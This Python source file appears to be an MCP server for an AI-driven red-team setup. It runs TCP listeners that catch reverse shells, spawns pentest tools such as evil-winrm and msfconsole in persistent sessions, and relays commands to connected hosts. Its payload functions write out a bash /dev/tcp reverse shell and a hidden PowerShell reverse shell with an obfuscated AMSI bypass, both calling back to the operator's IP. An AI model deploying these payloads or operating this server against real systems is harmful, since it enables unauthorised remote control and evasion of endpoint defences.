"""MCP server managing TCP listeners, reverse shell sessions, and local processes.

Provides seven tools:
- start_listener: Start TCP listener, wait for reverse shell connection
- start_process: Spawn a local interactive process in a PTY
- send_command: Send command to session, return output
- read_output: Read buffered output without sending a command
- stabilize_shell: Upgrade raw shell to interactive PTY
- list_sessions: List all listeners and sessions
- close_session: Close session/listener, optionally save transcript

Solves the persistent shell problem — Claude Code's Bash tool runs each command
as a separate process, so interactive reverse shells, privesc tools, and
credential-based access tools (evil-winrm, psexec.py, ssh) have no way to
maintain state between calls. This server manages long-lived sessions (both
remote TCP and local PTY) that persist across tool calls.

Usage:
    uv run python server.py
"""

from __future__ import annotations

import atexit
import fcntl
import json
import os
import pty
import re
import select
import shlex
import shutil
import signal
import socket
import struct
import subprocess
import sys
import termios
import threading
import time
import uuid
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path

from mcp.server.fastmcp import FastMCP
from starlette.requests import Request
from starlette.responses import JSONResponse

# Resolve engagement directory relative to the project root, not the server's
# own directory.  uv run --directory changes cwd to tools/shell-server/, so
# bare Path("engagement/...") would land artifacts inside the tools tree.
_PROJECT_ROOT = Path(__file__).resolve().parent.parent.parent

# Defaults
DEFAULT_LISTEN_HOST = "0.0.0.0"
DEFAULT_LISTEN_TIMEOUT = 300  # 5 minutes
DEFAULT_CMD_TIMEOUT = 10.0
DEFAULT_READ_TIMEOUT = 2.0
RECV_SIZE = 4096
PROBE_COMMAND = "echo __SHELL_PROBE__"
PROBE_MARKER = "__SHELL_PROBE__"
MARKER_START = "__CMD_START_7f3a__"
MARKER_END = "__CMD_END_7f3a__"

# --- Callback IP resolution ---


def _resolve_callback_ip() -> str:
    """Resolve the attackbox callback IP for reverse shell payloads.

    Priority: engagement config callback_ip > callback_interface > tun0 > wg0 > first non-lo.
    """
    # Check engagement config (simple key: value parsing — no yaml dependency)
    config_path = _PROJECT_ROOT / "engagement" / "config.yaml"
    if config_path.exists():
        try:
            text = config_path.read_text()
            for line in text.splitlines():
                line = line.strip()
                if line.startswith("#") or ":" not in line:
                    continue
                key, _, val = line.partition(":")
                val = val.strip().strip("'\"")
                if key.strip() == "callback_ip" and val:
                    return val
                if key.strip() == "callback_interface" and val:
                    ip = _ip_from_interface(val)
                    if ip:
                        return ip
        except Exception:
            pass

    # Auto-detect: tun0, wg0, then first non-loopback
    for iface in ("tun0", "wg0"):
        ip = _ip_from_interface(iface)
        if ip:
            return ip

    # Fallback: first non-loopback IPv4
    try:
        result = subprocess.run(
            ["ip", "-4", "-o", "addr", "show", "scope", "global"],
            capture_output=True,
            text=True,
            timeout=3,
        )
        for line in result.stdout.splitlines():
            parts = line.split()
            for i, p in enumerate(parts):
                if p == "inet" and i + 1 < len(parts):
                    return parts[i + 1].split("/")[0]
    except Exception:
        pass

    return "CALLBACK_IP"


def _ip_from_interface(iface: str) -> str | None:
    """Get IPv4 address from a network interface name."""
    try:
        result = subprocess.run(
            ["ip", "-4", "-o", "addr", "show", "dev", iface],
            capture_output=True,
            text=True,
            timeout=3,
        )
        for line in result.stdout.splitlines():
            parts = line.split()
            for i, p in enumerate(parts):
                if p == "inet" and i + 1 < len(parts):
                    return parts[i + 1].split("/")[0]
    except Exception:
        pass
    return None


def _linux_payload(ip: str, port: int) -> str:
    """One-liner bash reverse shell for Linux targets."""
    return f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"


def _windows_payload(ip: str, port: int) -> str:
    """Detached PowerShell reverse shell with AMSI bypass for Windows targets.

    AMSI bypass patches amsiInitFailed via split strings + [char] casts.
    Start-Process detaches from parent so shell survives xp_cmdshell/cmd /c exit.
    """
    amsi = (
        "$a=[Ref].Assembly.GetType("
        "'System.Management.Automation.'+[char]65+'msi'+[char]85+'tils');"
        "$b=$a.GetField('a'+'msiI'+'nitF'+'ailed','NonPublic,Static');"
        "$b.SetValue($null,$true)"
    )
    ps_shell = (
        f"$c=New-Object Net.Sockets.TCPClient('{ip}',{port});"
        "$s=$c.GetStream();[byte[]]$b=0..65535|%{0};"
        "while(($i=$s.Read($b,0,$b.Length)) -ne 0)"
        "{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
        "$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';"
        "$sb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length)}"
    )
    combined = f"{amsi};{ps_shell}"
    detached = (
        f"Start-Process -WindowStyle Hidden powershell -ArgumentList '-c {combined}'"
    )
    return f'powershell -c "{detached}"'


# Privileged Docker mode
SHELL_DOCKER_IMAGE = os.environ.get("SHELL_DOCKER_IMAGE", "red-run-shell:latest")
DOCKER_STAGE_DIR = os.environ.get(
    "SHELL_STAGE_DIR",
    str(_PROJECT_ROOT / "engagement" / "stage"),
)  # Host↔container shared staging
_docker_shell_available: bool | None = None  # Set at startup

# Real-time command log — tail -f this file to see what agents are doing
_CMD_LOG = _PROJECT_ROOT / "engagement" / "evidence" / "shell-commands.log"


def _log_command(session: "Session", command: str) -> None:
    """Append a timestamped command entry to the command log."""
    try:
        if _CMD_LOG.parent.exists():
            ts = datetime.now().strftime("%H:%M:%S")
            label = session.label or session.session_id[:8]
            _CMD_LOG.open("a").write(f"[{ts}] [{label}] {command}\n")
    except Exception:
        pass  # Never break send_command over logging


def _check_docker_shell() -> str | None:
    """Check if Docker and the shell image are available. Returns error message or None."""
    docker_path = shutil.which("docker")
    if not docker_path:
        return "docker not found. Install Docker to use privileged mode."

    try:
        result = subprocess.run(
            ["docker", "info"],
            capture_output=True,
            text=True,
            timeout=10,
        )
        if result.returncode != 0:
            return (
                "Docker daemon not running. Start Docker first.\n"
                f"stderr: {result.stderr.strip()}"
            )
    except subprocess.TimeoutExpired:
        return "docker info timed out — Docker daemon may be unresponsive."

    try:
        result = subprocess.run(
            ["docker", "image", "inspect", SHELL_DOCKER_IMAGE],
            capture_output=True,
            text=True,
            timeout=10,
        )
        if result.returncode != 0:
            return (
                f"Docker image '{SHELL_DOCKER_IMAGE}' not found. "
                f"Build it with: docker build -t {SHELL_DOCKER_IMAGE} tools/shell-server/"
            )
    except subprocess.TimeoutExpired:
        return "docker image inspect timed out."

    return None


def _find_orphan_containers() -> list[str]:
    """Find running red-run-* Docker containers not tracked by this process."""
    try:
        result = subprocess.run(
            ["docker", "ps", "--filter", "name=red-run-", "--format", "{{.Names}}"],
            capture_output=True,
            text=True,
            timeout=10,
        )
        if result.returncode != 0:
            return []
        return [
            name.strip() for name in result.stdout.strip().split("\n") if name.strip()
        ]
    except Exception:
        return []


def _kill_orphan_containers() -> list[str]:
    """Kill orphaned red-run-* containers from previous MCP sessions.

    Returns list of container names that were killed.
    """
    orphans = _find_orphan_containers()
    killed = []
    for name in orphans:
        try:
            subprocess.run(
                ["docker", "kill", name],
                capture_output=True,
                timeout=10,
            )
            killed.append(name)
        except Exception:
            pass
    return killed


@dataclass
class Listener:
    listener_id: str
    port: int
    host: str
    sock: socket.socket
    thread: threading.Thread
    timeout: int
    label: str
    status: str  # "listening" | "connected" | "timed_out" | "error"
    started_at: datetime
    session_id: str | None = None
    error_msg: str = ""


@dataclass
class Session:
    session_id: str
    conn: socket.socket | None
    remote_addr: tuple[str, int]
    port: int
    label: str
    session_type: str = "remote"  # "remote" | "local"
    master_fd: int | None = None  # PTY master fd (local only)
    process: subprocess.Popen | None = None  # subprocess handle (local only)
    command: str = ""  # original command (local only)
    privileged: bool = False  # running inside Docker container
    container_name: str | None = None  # Docker container name (privileged only)
    pty: bool = False
    prompt_pattern: str = ""
    platform: str = ""  # "windows" | "linux" | "" (auto-detected or caller-set)
    shell_type: str = ""  # "cmd" | "powershell" | "sh" | "" (auto-detected)
    status: str = "connected"  # "connected" | "stabilized" | "closed"
    connected_at: datetime = field(
        default_factory=lambda: datetime.now(tz=timezone.utc)
    )
    transcript: list[tuple[str, str, str]] = field(default_factory=list)
    live_log: Path | None = None
    _lock: threading.Lock = field(default_factory=threading.Lock)

    def log(self, direction: str, data: str) -> None:
        ts = datetime.now(tz=timezone.utc).isoformat()
        self.transcript.append((ts, direction, data))
        if self.live_log:
            prefix = ">>>" if direction == "send" else "<<<"
            try:
                with open(self.live_log, "a") as f:
                    f.write(f"[{ts}] {prefix}\n{data}\n\n")
            except OSError:
                pass

    def send(self, data: str) -> None:
        if self.session_type == "local":
            os.write(self.master_fd, data.encode())
        else:
            self.conn.sendall(data.encode())
        self.log("send", data)

    def recv(self, timeout: float = DEFAULT_READ_TIMEOUT) -> str:
        """Read available data from socket or PTY with timeout."""
        chunks: list[str] = []
        deadline = time.monotonic() + timeout
        fd = self.master_fd if self.session_type == "local" else self.conn
        while True:
            remaining = deadline - time.monotonic()
            if remaining <= 0:
                break
            ready, _, _ = select.select([fd], [], [], min(remaining, 0.5))
            if not ready:
                if chunks:
                    break
                continue
            try:
                if self.session_type == "local":
                    chunk = os.read(self.master_fd, RECV_SIZE)
                else:
                    chunk = self.conn.recv(RECV_SIZE)
            except (ConnectionError, OSError):
                break
            if not chunk:
                break
            chunks.append(chunk.decode(errors="replace"))
            # Brief pause to let more data arrive before next select
            time.sleep(0.05)
        result = "".join(chunks)
        if result:
            self.log("recv", result)
        return result

    def drain(self, timeout: float = 0.5) -> str:
        """Drain any pending output from the socket or PTY."""
        return self.recv(timeout=timeout)


def _detect_prompt(session: Session) -> str:
    """Probe the shell to detect its prompt pattern.

    Also auto-detects platform (windows/linux) from the probe output
    and sets session.platform if not already set.
    """
    session.drain(timeout=1.0)
    session.send(f"{PROBE_COMMAND}\n")
    time.sleep(1.0)
    output = session.recv(timeout=3.0)

    # Auto-detect platform and shell type from probe output
    if not session.platform:
        out_lower = output.lower()
        if any(sig in out_lower for sig in ["c:\\", "ps ", "windows", ">echo "]):
            session.platform = "windows"
        elif any(sig in out_lower for sig in ["$", "/home/", "/root/", "/bin/"]):
            session.platform = "linux"
    if not session.shell_type:
        if "PS " in output:
            session.shell_type = "powershell"
        elif session.platform == "windows":
            session.shell_type = "cmd"
        elif session.platform == "linux":
            session.shell_type = "sh"

    # Look for the line after the probe marker — that's the prompt
    lines = output.split("\n")
    for i, line in enumerate(lines):
        if PROBE_MARKER in line and i + 1 < len(lines):
            prompt_line = lines[i + 1].strip()
            if prompt_line:
                # Escape regex special chars and create a pattern
                escaped = re.escape(prompt_line)
                # Allow the last char to vary (e.g., $ or #)
                if len(escaped) > 1:
                    return escaped[:-1] + "."
                return escaped

    # Fallback: common prompt patterns
    return r"[\$#>]\s*$"


def create_server() -> FastMCP:
    """Create and configure the shell MCP server."""
    global _docker_shell_available
    docker_err = _check_docker_shell()
    _docker_shell_available = docker_err is None

    # Kill orphaned containers from previous MCP sessions (crashed, restarted,
    # etc.) — these hold ports and are invisible to list_sessions().
    if _docker_shell_available:
        killed = _kill_orphan_containers()
        if killed:
            print(
                f"[shell-server] Killed {len(killed)} orphaned container(s): "
                f"{', '.join(killed)}",
                file=sys.stderr,
            )

    sse_port = int(os.environ.get("SHELL_SSE_PORT", "8022"))
    mcp = FastMCP(
        "red-run-shell-server",
        host="127.0.0.1",
        port=sse_port,
        instructions=(
            "Manages TCP listeners, reverse shell sessions, and local "
            "interactive processes for red-run subagents. Use start_listener "
            "to catch reverse shells, start_process to spawn local "
            "interactive tools (evil-winrm, msfconsole, ssh, psexec.py), "
            "send_command to execute commands in sessions, stabilize_shell "
            "to upgrade to PTY, and close_session to clean up."
        ),
    )

    listeners: dict[str, Listener] = {}
    sessions: dict[str, Session] = {}

    def _cleanup() -> None:
        """Close all sockets, processes, and Docker containers on exit."""
        for session in sessions.values():
            try:
                if session.session_type == "local" and session.process:
                    # Kill Docker container first — SIGTERM to docker CLI
                    # doesn't reliably propagate to the container process
                    if session.container_name:
                        try:
                            subprocess.run(
                                ["docker", "kill", session.container_name],
                                capture_output=True,
                                timeout=5,
                            )
                        except Exception:
                            pass
                    try:
                        os.killpg(os.getpgid(session.process.pid), signal.SIGTERM)
                        session.process.wait(timeout=5)
                    except (ProcessLookupError, ChildProcessError):
                        pass
                    except subprocess.TimeoutExpired:
                        os.killpg(os.getpgid(session.process.pid), signal.SIGKILL)
                    if session.master_fd is not None:
                        os.close(session.master_fd)
                elif session.conn:
                    session.conn.close()
            except Exception:
                pass
        for listener in listeners.values():
            try:
                listener.sock.close()
            except Exception:
                pass

    atexit.register(_cleanup)

    def _listener_thread(listener: Listener) -> None:
        """Thread function that accepts one connection on the listener."""
        try:
            listener.sock.settimeout(1.0)
            deadline = time.monotonic() + listener.timeout
            while time.monotonic() < deadline:
                if listener.status != "listening":
                    return
                try:
                    conn, addr = listener.sock.accept()
                except socket.timeout:
                    continue

                # Got a connection
                print(
                    f"[listener {listener.listener_id}] accept() from {addr[0]}:{addr[1]}",
                    file=sys.stderr,
                    flush=True,
                )
                session_id = str(uuid.uuid4())[:8]
                session = Session(
                    session_id=session_id,
                    conn=conn,
                    remote_addr=addr,
                    port=listener.port,
                    label=listener.label,
                )

                # Set up live log for dashboard tailing
                evidence_dir = _PROJECT_ROOT / "engagement" / "evidence"
                if evidence_dir.exists():
                    safe_label = re.sub(r"[^a-zA-Z0-9_-]", "_", listener.label)
                    live_log_path = (
                        evidence_dir / f"shell-{session_id}-{safe_label}.log"
                    )
                    session.live_log = live_log_path
                    with open(live_log_path, "w") as f:
                        f.write(f"# Shell Live Log — {listener.label}\n")
                        f.write(f"# Remote: {addr[0]}:{addr[1]}\n")
                        f.write(f"# Port: {listener.port}\n")
                        f.write(f"# Started: {session.connected_at.isoformat()}\n\n")

                sessions[session_id] = session
                listener.session_id = session_id
                listener.status = "connected"
                print(
                    f"[listener {listener.listener_id}] session {session_id} registered from {addr[0]}:{addr[1]}",
                    file=sys.stderr,
                    flush=True,
                )

                # Close the listener socket — one connection per listener
                try:
                    listener.sock.close()
                except Exception:
                    pass

                # Brief pause to let the shell initialize, then probe for prompt
                time.sleep(0.5)
                session.drain(timeout=1.5)
                prompt = _detect_prompt(session)
                session.prompt_pattern = prompt

                return

            # Timed out without connection
            listener.status = "timed_out"
            try:
                listener.sock.close()
            except Exception:
                pass
        except Exception as e:
            listener.status = "error"
            listener.error_msg = str(e)
            print(
                f"[listener {listener.listener_id}] EXCEPTION in _listener_thread: {e}",
                file=sys.stderr,
                flush=True,
            )
            try:
                listener.sock.close()
            except Exception:
                pass

    @mcp.tool()
    def start_listener(
        port: int,
        host: str = DEFAULT_LISTEN_HOST,
        timeout: int = DEFAULT_LISTEN_TIMEOUT,
        label: str = "",
    ) -> str:
        """Start TCP listener in background thread, wait for reverse shell.

        Binds a TCP socket and waits for an incoming connection. When a
        reverse shell connects, it creates a session you can interact with
        via send_command. Only accepts one connection per listener.

        Args:
            port: TCP port to listen on (e.g., 4444, 9001).
            host: Bind address (default "0.0.0.0" — all interfaces).
            timeout: Seconds to wait for a connection before giving up
                     (default 300 = 5 minutes).
            label: Optional label for this listener (e.g., "ghostcat-rce",
                   "pwnkit-root"). Used in transcript filenames.
        """
        # Check for port conflicts
        for lid, existing in listeners.items():
            if existing.port == port and existing.status == "listening":
                return f"ERROR: Port {port} already has an active listener (id: {lid})"

        listener_id = str(uuid.uuid4())[:8]

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind((host, port))
            sock.listen(1)
        except OSError as e:
            return f"ERROR: Failed to bind {host}:{port} — {e}"

        listener = Listener(
            listener_id=listener_id,
            port=port,
            host=host,
            sock=sock,
            thread=threading.Thread(target=_listener_thread, daemon=True, args=()),
            timeout=timeout,
            label=label or f"shell-{port}",
            status="listening",
            started_at=datetime.now(tz=timezone.utc),
        )

        # Create thread with correct args
        listener.thread = threading.Thread(
            target=_listener_thread,
            args=(listener,),
            daemon=True,
        )

        listeners[listener_id] = listener
        listener.thread.start()

        # Resolve callback IP and generate payloads
        callback_ip = _resolve_callback_ip()

        return json.dumps(
            {
                "listener_id": listener_id,
                "status": "listening",
                "address": f"{host}:{port}",
                "callback_ip": callback_ip,
                "timeout": timeout,
                "label": listener.label,
                "message": (
                    f"Listening on {host}:{port}. Send a reverse shell payload to "
                    f"this port, then call list_sessions() to check for connections. "
                    f"Listener will timeout after {timeout}s if no connection arrives."
                ),
                "payloads": {
                    "linux": _linux_payload(callback_ip, port),
                    "windows": _windows_payload(callback_ip, port),
                },
            },
            indent=2,
        )

    @mcp.tool()
    def start_process(
        command: str,
        label: str = "",
        timeout: int = 30,
        privileged: bool = False,
        startup_delay: int = 2,
    ) -> str:
        """Spawn a local interactive process in a PTY.

        Starts a local command (e.g., msfconsole, evil-winrm, ssh,
        psexec.py) in a persistent PTY session. Interact with it using
        send_command and read_output, just like a reverse shell session.

        Args:
            command: Command to run (e.g., "msfconsole -q",
                     "evil-winrm -i 10.10.10.5 -u admin -p pass",
                     "ssh user@target").
            label: Optional label for this session (e.g., "msfconsole",
                   "evil-winrm-dc01"). Used in transcript filenames.
            timeout: Seconds to wait for the process to start and produce
                     initial output (default 30).
            privileged: Run inside the red-run-shell Docker container.
            startup_delay: Seconds to wait before probing for a prompt
                     (default 2). Increase for slow-connecting tools like
                     evil-winrm (30) or psexec.py over high-latency links.
                       The container includes a full pentest toolkit:
                       evil-winrm, impacket (psexec/wmiexec/smbexec/
                       smbclient/mssqlclient), chisel, ligolo-ng, socat,
                       Responder, mitm6, and tcpdump. Also grants network
                       capabilities (NET_RAW, NET_ADMIN, NET_BIND_SERVICE)
                       for tools needing raw sockets.
                       Requires the red-run-shell Docker image.
        """
        session_id = str(uuid.uuid4())[:8]
        effective_label = label or command.split()[0].split("/")[-1]

        # Wrap command in Docker if privileged mode requested
        container_name: str | None = None
        if privileged:
            if not _docker_shell_available:
                return (
                    f"ERROR: Privileged mode requires Docker image "
                    f"'{SHELL_DOCKER_IMAGE}'. Build it with: "
                    f"docker build -t {SHELL_DOCKER_IMAGE} tools/shell-server/"
                )
            # ENTRYPOINT is /bin/bash, so pass -c <cmd> as args
            container_name = f"red-run-{session_id}"
            os.makedirs(DOCKER_STAGE_DIR, exist_ok=True)
            command = (
                f"docker run --rm -i --network=host "
                f"--name {container_name} "
                f"-v {DOCKER_STAGE_DIR}:{DOCKER_STAGE_DIR} "
                f"--cap-drop=ALL --cap-add=NET_RAW --cap-add=NET_ADMIN "
                f"--cap-add=NET_BIND_SERVICE {SHELL_DOCKER_IMAGE} "
                f"-c {shlex.quote(command)}"
            )

        try:
            master_fd, slave_fd = pty.openpty()

            # Set terminal size on master
            fcntl.ioctl(
                master_fd,
                termios.TIOCSWINSZ,
                struct.pack("HHHH", 50, 200, 0, 0),
            )

            proc = subprocess.Popen(
                command,
                shell=True,
                stdin=slave_fd,
                stdout=slave_fd,
                stderr=slave_fd,
                preexec_fn=os.setsid,
                close_fds=True,
            )

            # Parent only uses master — close slave
            os.close(slave_fd)

        except Exception as e:
            return f"ERROR: Failed to start process — {e}"

        # Wait for the process to start (and optionally connect to remote)
        time.sleep(startup_delay)

        # Check if process exited immediately
        if proc.poll() is not None:
            # Read any output before returning error
            try:
                ready, _, _ = select.select([master_fd], [], [], 1.0)
                output = ""
                if ready:
                    output = os.read(master_fd, RECV_SIZE).decode(errors="replace")
                os.close(master_fd)
            except Exception:
                output = ""
            return (
                f"ERROR: Process exited immediately with code "
                f"{proc.returncode}.\nOutput: {output}"
            )

        session = Session(
            session_id=session_id,
            conn=None,
            remote_addr=("local", proc.pid),
            port=0,
            label=effective_label,
            session_type="local",
            master_fd=master_fd,
            process=proc,
            command=command,
            privileged=privileged,
            container_name=container_name,
            pty=True,
        )

        # Set up live log for dashboard tailing
        evidence_dir = _PROJECT_ROOT / "engagement" / "evidence"
        live_log_path = None
        if evidence_dir.exists():
            safe_label = re.sub(r"[^a-zA-Z0-9_-]", "_", effective_label)
            live_log_path = evidence_dir / f"shell-{session_id}-{safe_label}.log"
            session.live_log = live_log_path
            # Write header
            with open(live_log_path, "w") as f:
                f.write(f"# Shell Live Log — {effective_label}\n")
                f.write(f"# Command: {command}\n")
                f.write(f"# Started: {session.connected_at.isoformat()}\n\n")

        # Drain initial output (banner, MOTD, etc.)
        session.drain(timeout=2.0)

        # Detect prompt
        prompt = _detect_prompt(session)
        session.prompt_pattern = prompt

        sessions[session_id] = session

        return json.dumps(
            {
                "session_id": session_id,
                "status": "connected",
                "pid": proc.pid,
                "command": command,
                "label": effective_label,
                "privileged": privileged,
                "prompt_pattern": prompt,
                "live_log": str(live_log_path) if live_log_path else None,
                "message": (
                    f"Process started (PID {proc.pid})"
                    f"{' [privileged/Docker]' if privileged else ''}. "
                    f"Use send_command() to interact and close_session() to terminate."
                    + (
                        " Tip: The live_log is visible in the agent dashboard automatically."
                        if live_log_path
                        else ""
                    )
                ),
            },
            indent=2,
        )

    @mcp.tool()
    def send_command(
        session_id: str,
        command: str,
        timeout: float = DEFAULT_CMD_TIMEOUT,
        expect: str = "",
    ) -> str:
        """Send command to a shell session and return the output.

        Sends the command, then reads output until the shell prompt is
        detected, the expect pattern is matched, or timeout is reached.

        Args:
            session_id: Session ID from start_listener, start_process, or
                        list_sessions.
            command: Shell command to execute (e.g., "id", "cat /etc/passwd").
            timeout: Seconds to wait for command output (default 10).
            expect: Optional regex pattern — stop reading when this matches
                    the output (useful for long-running commands where you
                    know what success looks like).
        """
        if session_id not in sessions:
            available = ", ".join(sessions.keys()) if sessions else "none"
            return f"ERROR: Session '{session_id}' not found. Available: {available}"

        session = sessions[session_id]
        if session.status == "closed":
            return f"ERROR: Session '{session_id}' is closed."

        if session.session_type == "local" and session.process.poll() is not None:
            session.status = "closed"
            return f"ERROR: Process exited with code {session.process.returncode}."

        # Real-time command log for operator visibility
        _log_command(session, command)

        with session._lock:
            # Drain any leftover output
            session.drain(timeout=0.3)

            if session.pty:
                # PTY shell — send command directly and wait for prompt
                session.send(f"{command}\n")
                output = _read_until_prompt(session, timeout, expect)
            else:
                # Raw shell — use markers to delimit output
                if session.shell_type == "powershell":
                    # PowerShell: ; is statement separator, Write-Output for markers
                    wrapped = f"Write-Output '{MARKER_START}'; {command}; Write-Output '{MARKER_END}'\n"
                elif session.shell_type == "cmd" or session.platform == "windows":
                    # cmd.exe: & is statement separator
                    wrapped = f"echo {MARKER_START}& {command}& echo {MARKER_END}\n"
                else:
                    # Unix: ; is statement separator
                    wrapped = f"echo {MARKER_START}; {command}; echo {MARKER_END}\n"
                session.send(wrapped)
                output = _read_until_marker(session, timeout, expect)

            return output

    def _read_until_prompt(session: Session, timeout: float, expect: str) -> str:
        """Read output until prompt pattern is detected or timeout."""
        chunks: list[str] = []
        deadline = time.monotonic() + timeout
        prompt_re = (
            re.compile(session.prompt_pattern) if session.prompt_pattern else None
        )
        expect_re = re.compile(expect) if expect else None

        while time.monotonic() < deadline:
            remaining = deadline - time.monotonic()
            data = session.recv(timeout=min(remaining, 1.0))
            if data:
                chunks.append(data)
                combined = "".join(chunks)
                if expect_re and expect_re.search(combined):
                    break
                if prompt_re and prompt_re.search(combined.split("\n")[-1]):
                    break
            elif chunks:
                # No more data coming and we have something
                break

        result = "".join(chunks)

        return result.strip()

    def _read_until_marker(session: Session, timeout: float, expect: str) -> str:
        """Read output between start/end markers for raw shells."""
        chunks: list[str] = []
        deadline = time.monotonic() + timeout
        expect_re = re.compile(expect) if expect else None

        while time.monotonic() < deadline:
            remaining = deadline - time.monotonic()
            data = session.recv(timeout=min(remaining, 1.0))
            if data:
                chunks.append(data)
                combined = "".join(chunks)
                # Check for end marker at a line boundary (not inside echoed cmd)
                if f"\n{MARKER_END}" in combined or combined.startswith(MARKER_END):
                    break
                if expect_re and expect_re.search(combined):
                    break
            elif chunks and f"\n{MARKER_START}" in "".join(chunks):
                # We have the start marker but no more data — give it a moment
                time.sleep(0.2)

        combined = "".join(chunks)

        # Extract content between markers.  Match markers at line boundaries
        # to avoid false matches inside echoed commands (Windows cmd.exe echoes
        # the full "echo MARKER& command& echo MARKER" line before executing).
        start_idx = -1
        end_idx = -1
        for m in re.finditer(re.escape(MARKER_START), combined):
            pos = m.start()
            # Valid if at position 0 or preceded by a newline
            if pos == 0 or combined[pos - 1] == "\n":
                start_idx = pos
                break
        if start_idx != -1:
            # Search for end marker only after start marker
            search_from = start_idx + len(MARKER_START)
            for m in re.finditer(re.escape(MARKER_END), combined[search_from:]):
                pos = m.start() + search_from
                if combined[pos - 1] == "\n":
                    end_idx = pos
                    break

        if start_idx != -1 and end_idx != -1:
            content = combined[start_idx + len(MARKER_START) : end_idx]
            return content.strip()
        elif start_idx != -1:
            content = combined[start_idx + len(MARKER_START) :]
            return content.strip() + "\n[timeout — output may be incomplete]"
        else:
            return combined.strip()

    @mcp.tool()
    def read_output(
        session_id: str,
        timeout: float = DEFAULT_READ_TIMEOUT,
    ) -> str:
        """Read buffered output from a session without sending a command.

        Useful for checking if a long-running command has produced output,
        or for reading the initial banner/MOTD after connection.

        Args:
            session_id: Session ID to read from.
            timeout: Seconds to wait for output (default 2).
        """
        if session_id not in sessions:
            available = ", ".join(sessions.keys()) if sessions else "none"
            return f"ERROR: Session '{session_id}' not found. Available: {available}"

        session = sessions[session_id]
        if session.status == "closed":
            return f"ERROR: Session '{session_id}' is closed."

        with session._lock:
            output = session.recv(timeout=timeout)
            return output if output else "[no output available]"

    @mcp.tool()
    def stabilize_shell(
        session_id: str,
        method: str = "auto",
    ) -> str:
        """Upgrade a raw reverse shell to an interactive PTY.

        Tries python3, python2, then script(1) to spawn a PTY. Sets TERM
        and stty for proper terminal behavior. Re-detects the prompt after
        stabilization.

        Args:
            session_id: Session ID to stabilize.
            method: Stabilization method — "auto" (try all), "python3",
                    "python2", or "script". Default "auto".
        """
        if session_id not in sessions:
            available = ", ".join(sessions.keys()) if sessions else "none"
            return f"ERROR: Session '{session_id}' not found. Available: {available}"

        session = sessions[session_id]
        if session.status == "closed":
            return f"ERROR: Session '{session_id}' is closed."
        if session.pty:
            return f"Session '{session_id}' already has a PTY."
        if session.platform == "windows":
            return json.dumps(
                {
                    "status": "skipped",
                    "session_id": session_id,
                    "platform": "windows",
                    "message": (
                        "PTY stabilization is not applicable to Windows shells. "
                        "The session is usable via send_command() with Windows-"
                        "compatible command separators (auto-detected)."
                    ),
                },
                indent=2,
            )

        methods_to_try: list[tuple[str, str]] = []
        if method == "auto":
            methods_to_try = [
                ("python3", "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"),
                ("python2", "python -c 'import pty; pty.spawn(\"/bin/bash\")'"),
                ("script", "script -qc /bin/bash /dev/null"),
            ]
        elif method == "python3":
            methods_to_try = [
                ("python3", "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"),
            ]
        elif method == "python2":
            methods_to_try = [
                ("python2", "python -c 'import pty; pty.spawn(\"/bin/bash\")'"),
            ]
        elif method == "script":
            methods_to_try = [
                ("script", "script -qc /bin/bash /dev/null"),
            ]
        else:
            return (
                f"ERROR: Unknown method '{method}'. Use: auto, python3, python2, script"
            )

        with session._lock:
            for name, cmd in methods_to_try:
                session.drain(timeout=0.5)
                session.send(f"{cmd}\n")
                time.sleep(1.5)
                session.drain(timeout=2.0)

                # Check if we got a new prompt (indicates PTY spawned)
                session.send(f"{PROBE_COMMAND}\n")
                time.sleep(1.0)
                probe_output = session.recv(timeout=2.0)

                if PROBE_MARKER in probe_output:
                    # PTY spawned successfully — set terminal options
                    session.send("export TERM=xterm-256color\n")
                    time.sleep(0.3)
                    session.send("stty rows 50 columns 200\n")
                    time.sleep(0.3)
                    session.drain(timeout=0.5)

                    # Re-detect prompt
                    prompt = _detect_prompt(session)
                    session.prompt_pattern = prompt
                    session.pty = True
                    session.status = "stabilized"

                    return json.dumps(
                        {
                            "status": "stabilized",
                            "method": name,
                            "session_id": session_id,
                            "prompt_pattern": prompt,
                            "message": (
                                f"Shell stabilized via {name}. PTY active, "
                                f"TERM=xterm-256color. Use send_command() for "
                                f"interactive commands."
                            ),
                        },
                        indent=2,
                    )

            return json.dumps(
                {
                    "status": "failed",
                    "session_id": session_id,
                    "tried": [name for name, _ in methods_to_try],
                    "message": (
                        "Could not stabilize shell — none of the PTY methods "
                        "succeeded. The shell is still usable via send_command() "
                        "with marker-based output capture, but interactive programs "
                        "(sudo, su, ssh) may not work correctly."
                    ),
                },
                indent=2,
            )

    @mcp.tool()
    def list_sessions() -> str:
        """List all listeners and sessions with status.

        Returns a summary of all active listeners (waiting for connections)
        and all shell sessions (connected, stabilized, or closed).
        """
        result: dict = {"listeners": [], "sessions": []}

        for lid, listener in listeners.items():
            result["listeners"].append(
                {
                    "listener_id": lid,
                    "port": listener.port,
                    "host": listener.host,
                    "status": listener.status,
                    "label": listener.label,
                    "started_at": listener.started_at.isoformat(),
                    "session_id": listener.session_id,
                }
            )

        tracked_containers: set[str] = set()
        for sid, session in sessions.items():
            if session.session_type == "local":
                addr = f"local (PID {session.remote_addr[1]})"
            else:
                addr = f"{session.remote_addr[0]}:{session.remote_addr[1]}"
            entry = {
                "session_id": sid,
                "session_type": session.session_type,
                "remote_addr": addr,
                "label": session.label,
                "status": session.status,
                "pty": session.pty,
                "platform": session.platform or "unknown",
                "shell_type": session.shell_type or "unknown",
                "connected_at": session.connected_at.isoformat(),
                "transcript_lines": len(session.transcript),
            }
            if session.session_type == "local":
                entry["command"] = session.command
                entry["privileged"] = session.privileged
                if session.container_name:
                    entry["container_name"] = session.container_name
                    tracked_containers.add(session.container_name)
            else:
                entry["port"] = session.port
            if session.live_log:
                entry["live_log"] = str(session.live_log)
            result["sessions"].append(entry)

        # Detect orphaned Docker containers not tracked by this MCP instance
        if _docker_shell_available:
            running = _find_orphan_containers()
            orphans = [c for c in running if c not in tracked_containers]
            if orphans:
                result["orphan_containers"] = orphans
